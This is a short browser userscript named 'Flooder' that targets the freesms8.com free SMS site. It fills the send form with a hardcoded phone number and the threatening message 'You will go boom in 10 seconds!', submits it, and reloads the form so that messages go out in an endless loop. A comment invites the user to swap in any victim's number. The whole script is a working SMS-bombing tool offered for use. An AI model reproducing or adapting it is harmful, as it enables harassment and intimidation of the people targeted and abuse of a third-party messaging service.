// ==UserScript==
// @name           Flooder
// @namespace      vipul
// @description    flood any number via freesms8 :)
// @include        http://www.freesms8.com/*
// ==/UserScript==

var number="9051950944"; // change this value to the number you want to flood
var text="You will go boom in 10 seconds! " + Math.floor(Math.random()*999);

if(document.location=="http://www.freesms8.com/QuickSMS.aspx" ||document.location=="http://www.freesms8.com/quickSMS.aspx")

{
document.forms[1].elements[9].value=number;

document.forms[1].elements[10].value=text;

document.forms[1].elements[12].click();

}

if(document.location=="http://www.freesms8.com/QuickSent.aspx")
{
document.location="http://www.freesms8.com/QuickSMS.aspx"; // u may have to change the 'Q' to 'q' here, see the url in your browser and change it accordingly
}